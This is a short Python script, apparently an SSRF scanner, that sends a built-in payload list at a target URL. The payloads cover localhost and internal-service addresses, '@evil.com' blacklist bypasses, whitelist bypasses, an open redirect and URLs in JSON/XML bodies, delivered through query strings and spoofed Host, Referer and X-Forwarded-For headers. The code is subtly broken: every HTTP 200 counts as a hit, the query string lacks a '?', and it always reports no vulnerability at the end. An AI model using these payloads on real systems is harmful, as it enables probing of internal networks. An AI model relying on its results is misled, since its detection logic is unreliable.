import requests
from urllib.parse import urlencode

# Define SSRF payloads
payloads = {
    "ssrf_server": ["http://127.0.0.1", "http://localhost"],
    "ssrf_backend": ["http://internal-service", "http://database-service"],
    "blacklist_bypass": ["http://127.0.0.1@evil.com", "http://localhost@evil.com"],
    "whitelist_bypass": ["http://whitelisted.com@127.0.0.1", "http://whitelisted.com@localhost"],
    "open_redirect": ["http://vulnerable-site.com/redirect?url=http://evil.com"],
    "partial_urls": ["//localhost", "//127.0.0.1"],
    "urls_in_data": ['{"url": "http://127.0.0.1"}', '<url>http://127.0.0.1</url>'],
    "referer_header": ["http://127.0.0.1", "http://localhost"]
}

def send_request(url, payload, headers=None):
    try:
        response = requests.get(url + payload, headers=headers, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

def check_ssrf(url):
    results = []
    for category, payload_list in payloads.items():
        results.append(f"Testing {category} payloads")
        for payload in payload_list:
            full_url = url + urlencode({'url': payload})
            results.append(f"Testing with payload: {payload}")

            response = send_request(full_url, "")
            if response:
                if analyze_response(response, payload):
                    results.append(f"Possible SSRF vulnerability detected with payload: {payload}")
                    continue

            headers = {'X-Forwarded-For': payload, 'Referer': payload, 'Host': payload}
            response = send_request(full_url, "", headers=headers)
            if response:
                if analyze_response(response, payload):
                    results.append(f"Possible SSRF vulnerability detected with payload: {payload}")
                    continue

            if category == "urls_in_data":
                headers = {'Content-Type': 'application/json'}
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                if response:
                    if analyze_response(response, payload):
                        results.append(f"Possible SSRF vulnerability detected with payload: {payload}")
                        continue
    results.append("No SSRF vulnerability detected.")
    return results

def analyze_response(response, payload):
    if "Metadata" in response.text or "169.254.169.254" in response.text or response.status_code == 200:
        return True
    return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python ssrf_tool.py <url>")
    else:
        result = check_ssrf(sys.argv[1])
        for line in result:
            print(line)
